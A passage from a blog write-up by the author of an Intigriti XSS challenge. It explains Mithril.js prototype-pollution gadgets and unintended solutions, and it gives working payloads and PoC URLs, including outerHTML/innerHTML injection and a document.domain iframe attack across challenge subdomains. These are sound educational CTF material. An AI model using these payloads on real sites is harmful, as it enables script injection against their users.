+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Now, our goal is to fail <code>hasPropertyKey(vnode, key, ns)</code> and make it returns <code>false</code>:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L815">https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L815</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">hasPropertyKey</span><span class="token punctuation">(</span><span class="token parameter">vnode<span class="token punctuation">,</span> key<span class="token punctuation">,</span> ns</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">// Filter out namespaced keys</span>
+  <span class="token keyword">return</span> ns <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>
+    <span class="token comment">// If it's a custom element, just keep it.</span>
+    vnode<span class="token punctuation">.</span>tag<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> vnode<span class="token punctuation">.</span>attrs <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> vnode<span class="token punctuation">.</span>attrs<span class="token punctuation">.</span>is <span class="token operator">||</span>
+    <span class="token comment">// If it's a normal element, let's try to avoid a few browser bugs.</span>
+    key <span class="token operator">!==</span> <span class="token string">"href"</span> <span class="token operator">&amp;&amp;</span> key <span class="token operator">!==</span> <span class="token string">"list"</span> <span class="token operator">&amp;&amp;</span> key <span class="token operator">!==</span> <span class="token string">"form"</span> <span class="token operator">&amp;&amp;</span> key <span class="token operator">!==</span> <span class="token string">"width"</span> <span class="token operator">&amp;&amp;</span> key <span class="token operator">!==</span> <span class="token string">"height"</span><span class="token comment">// &amp;&amp; key !== "type"</span>
+    <span class="token comment">// Defer the property check until *after* we check everything.</span>
+  <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> vnode<span class="token punctuation">.</span>dom
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It returns <code>false</code> if <code>ns</code> is not <code>undefined</code>. But wait, where is this <code>ns</code> comes from?</p>
+<p>Here is the code:  <a target="_blank" rel="noopener" href="https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L15">https://github.com/MithrilJS/mithril.js/blob/v2.0.4/render/render.js#L15</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getNameSpace</span><span class="token punctuation">(</span><span class="token parameter">vnode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> vnode<span class="token punctuation">.</span>attrs <span class="token operator">&amp;&amp;</span> vnode<span class="token punctuation">.</span>attrs<span class="token punctuation">.</span>xmlns <span class="token operator">||</span> nameSpace<span class="token punctuation">[</span>vnode<span class="token punctuation">.</span>tag<span class="token punctuation">]</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>It’s from <code>vnode.attrs.xmlns</code>, so we can pollute this attribute.</p>
+<p>In order to not affect other functionalities, we can use the default namespace for HTML: <code>http://www.w3.org/1999/xhtml</code></p>
+<p>To piece all the puzzles together, following is a simple proof-of-concept:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> App <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token function-variable function">view</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">m</span><span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token keyword">class</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>xmlns <span class="token operator">=</span> <span class="token string">'http://www.w3.org/1999/xhtml'</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>autofocus <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token constant">ONFOCUS</span> <span class="token operator">=</span> <span class="token string">'alert(1)'</span>
+m<span class="token punctuation">.</span><span class="token function">mount</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'main'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> App<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>To sum up, we need to:</p>
+<ol>
+<li>Pollute Array.prototype[1] to bypass checkHost() check</li>
+<li>Pollute a few properties on Object.prototype including <code>xmlns</code>, <code>autofocus</code> and <code>ONFOCUS</code> to perform XSS</li>
+</ol>
+<p>As what I said in the beginning, the challenge is all about prototype pollution!</p>
+<p>Here is what we need in the end:</p>
+<pre class="line-numbers language-none"><code class="language-none">?config[window-toolbar][constructor][prototype][1]&#x3D;8080&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][autofocus]&#x3D;1&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][ONFOCUS]&#x3D;alert(document.domain)&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][xmlns]&#x3D;http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>URL: <a target="_blank" rel="noopener" href="https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422?config%5Bwindow-toolbar%5D%5Bconstructor%5D%5Bprototype%5D%5B1%5D=8080&settings%5Broot%5D%5BownerDocument%5D%5BdefaultView%5D%5BJSON%5D%5Bconstructor%5D%5Bprototype%5D%5Bautofocus%5D=1&settings%5Broot%5D%5BownerDocument%5D%5BdefaultView%5D%5BJSON%5D%5Bconstructor%5D%5Bprototype%5D%5BONFOCUS%5D=alert(document.domain)&settings%5Broot%5D%5BownerDocument%5D%5BdefaultView%5D%5BJSON%5D%5Bconstructor%5D%5Bprototype%5D%5Bxmlns%5D=http://www.w3.org/1999/xhtml">https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422?config[window-toolbar][constructor][prototype][1]=8080&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][autofocus]=1&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][ONFOCUS]=alert(document.domain)&amp;settings[root][ownerDocument][defaultView][JSON][constructor][prototype][xmlns]=http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml</a></p>
+<h2><span id="other-script-gadgets">Other script gadgets</span></h2><p>Besides the above gadget, some players also find another one.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> App <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token function-variable function">view</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">m</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token keyword">class</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>tag <span class="token operator">=</span> <span class="token string">'img'</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'1'</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>img <span class="token operator">=</span> <span class="token string">'http://www.w3.org/1999/xhtml'</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>attrs <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>Onerror <span class="token operator">=</span> <span class="token string">'alert(1)'</span>
+m<span class="token punctuation">.</span><span class="token function">mount</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'main'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> App<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It creates a new element from nothing by polluting <code>Object.prototype.tag</code>. The rest part is similar with the intended gadget.</p>
+<p>And also this cool gadget found by <a target="_blank" rel="noopener" href="https://twitter.com/lbrnli1234">@lbrnli1234</a>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> App <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token function-variable function">view</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">m</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token keyword">class</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string">"hello"</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>tag <span class="token operator">=</span> <span class="token string">'style'</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>attrs <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>Onerror <span class="token operator">=</span> <span class="token string">'alert(1)'</span>
+m<span class="token punctuation">.</span><span class="token function">mount</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'main'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> App<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="unintendedfor-the-previous-one-not-revenge-challenge">Unintended(for the previous one, not revenge challenge)</span></h2><h3><span id="1-unintended-but-fixed-solution">#1 Unintended but fixed solution</span></h3><p>Before the original challenge has released to the public, @PinkDraconian gave early access to the other four players for private testing.</p>
+<p>At that time, there is no <code>sanitize</code> function, and <code>root</code> is added to DOM before Mithril.js.</p>
+<p>To my surprise, one player found an unintended solution:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">settings<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>outerHTML<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&lt;</span>input autofocus onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>It works because you can assign any value to the DOM in the <code>merge</code> function.</p>
+<p>I was too focused on prototype pollution to find this unintended, thanks again to the player for finding it before the challenge was released to the public.</p>
+<p>Also, this attack surface creates more other ways to the unintended because one can access <code>document</code> and <code>window</code>, like:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;svg onload=alert(1)>'</span>
+document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'javascript:alert(1)'</span>
+window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'javascript:alert(1)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>To prevent this, I added a sanitize function to filter dangerous characters, hoping to close the door for injecting arbitrary HTML.</p>
+<p>But, as you know, I failed. So I try to fix it again and release this revenge challenge.</p>
+<h3><span id="2-unintended-but-not-fixed-solution">#2 Unintended but not fixed solution</span></h3><p>After the patch, I found another interesting unintended solution.</p>
+<p>Remember that we can set the value for any attributes on <code>document</code>?</p>
+<p>We can set <code>document.domain</code> to <code>intigriti.io</code> and then leverage another challenge from a different subdomain!</p>
+<p>If both subdomains set their domain to <code>intigriti.io</code>, they can interact with each other as if they are same-origin! See <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Document/domain">MDN docs</a> for more detail.</p>
+<p>For example, we can:</p>
+<ol>
+<li>Use XSS in challenge-0222.intigriti.io, change <code>document.domain</code> to <code>intigriti.io</code></li>
+<li>Add an iframe to embed challenge-0422.intigriti.io, also set document.domain via config query string</li>
+<li>It’s same-origin now, we can perform XSS on <code>challege-0422</code> from <code>challenge-0222</code>.</li>
+</ol>
+<p>Code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>domain<span class="token operator">=</span><span class="token string">'intigriti.io'</span><span class="token punctuation">;</span>
+a<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+a<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'https://challenge-0422.intigriti.io/challenge/Window Maker.html?config[window-toolbar][constructor][prototype][1]=8080&amp;settings[root][ownerDocument][domain]=intigriti.io'</span><span class="token punctuation">;</span>
+document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+a<span class="token punctuation">.</span><span class="token function-variable function">onload</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
+    a<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">'&lt;style onload=alert(document.domain)>'</span><span class="token punctuation">;</span>
+  <span class="token comment">// we need to change it back</span>
+    a<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span>domain<span class="token operator">=</span><span class="token string">'challenge-0422.intigriti.io'</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>PoC URL:</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;challenge-0222.intigriti.io&#x2F;challenge&#x2F;xss.html?q&#x3D;%3Cstyle%20onload&#x3D;eval(uri)%3E&amp;first&#x3D;yes#%0adocument.domain&#x3D;%27intigriti.io%27;a&#x3D;document.createElement(%27iframe%27);a.src&#x3D;%27https:&#x2F;&#x2F;challenge-0422.intigriti.io&#x2F;challenge&#x2F;Window%20Maker.html?config[window-toolbar][constructor][prototype][1]&#x3D;8080&amp;settings[root][ownerDocument][domain]&#x3D;intigriti.io%27;document.body.appendChild(a);a.onload&#x3D;function()%7BsetTimeout(() &#x3D;&gt; &#123;a.contentWindow.document.body.innerHTML&#x3D;&#39;&lt;style onload&#x3D;alert(document.domain)&gt;&#39;;a.contentWindow.document.domain&#x3D;&#39;challenge-0422.intigriti.io&#39;&#125;,1000)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>I talked with @PinkDraconian about this fantastic solution, we decided not to fix it and only accept the first report.</p>
+<p>As far as I know, no one has submitted this kind of solution.</p>
+<p>In the revenge challenge, I exclude this solution by adding a rule saying that: <code>Should not leverage other challenges on the same domain.</code></p>
+<p>By the way, it will be no longer possible from Chrome 106: <a target="_blank" rel="noopener" href="https://developer.chrome.com/blog/immutable-document-domain/">https://developer.chrome.com/blog/immutable-document-domain/</a></p>
+<h2><span id="takeaways">Takeaways</span></h2><ol>
+<li>Prototype pollution is powerful</li>
+<li>Making a good challenge is hard</li>
+<li>Now, I know how the author feels when they saw my unintended</li>
+</ol>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2022/05/05/en/angstrom-ctf-2022-writeup-en/">ångstromCTF 2022 Writeup</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/">Intigriti 0422 XSS Challenge Author Writeup</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2022/05/02/intigriti-revenge-challenge-author-writeup/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
